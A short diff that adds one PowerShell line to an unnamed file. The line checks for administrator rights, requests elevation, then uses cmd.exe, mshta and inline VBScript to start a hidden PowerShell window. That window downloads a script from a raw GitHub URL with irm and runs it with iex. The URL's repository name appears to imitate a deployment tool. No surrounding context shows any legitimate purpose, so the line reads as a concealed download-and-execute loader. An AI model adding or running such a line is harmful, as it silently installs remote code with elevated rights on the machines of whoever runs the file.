@@ -1,0 +1,2 @@
+﻿
+if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process cmd.exe '/C mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell.exe /C irm https://raw.githubusercontent.com/WPKG2/wpkg-includer/main/wpkg_installrun | iex"", 0:close")' -Verb RunAs; exit }
